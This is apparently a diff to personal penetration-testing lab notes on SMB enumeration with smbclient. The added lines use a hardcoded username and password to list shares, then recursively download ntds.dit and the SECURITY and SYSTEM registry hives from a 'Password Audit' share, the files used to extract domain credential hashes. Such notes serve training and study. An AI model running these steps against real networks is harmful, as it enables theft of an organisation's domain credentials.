@@ -8,3 +8,31 @@ sudo /etc/init.d/smbd restart
 #Listing net shares on the Windows Server 2016 machine through local port forwarding
 smbclient -L 127.0.0.1 -U Administrator
 smbclient -L 10.11.0.22 --port=4455 --user=Administrator
+
+#Authenticated connection to SMB 
+smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'
+└─$ smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Password Audit  Disk      
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+-->
+
+smbclient -L \\\\192.168.155.175\\Password\ Audit -U 'V.Ventz%HotelCalifornia194!'
+
+-->
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (3174.4 KiloBytes/sec) (average 3174.4 KiloBytes/sec)
+getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (125.0 KiloBytes/sec) (average 3124.8 KiloBytes/sec)
+getting file \registry\SECURITY of size 65536 as registry/SECURITY (470.6 KiloBytes/sec) (average 3079.7 KiloBytes/sec)
+getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3202.5 KiloBytes/sec) (average 3127.6 KiloBytes/sec)
+smb: \> 
+
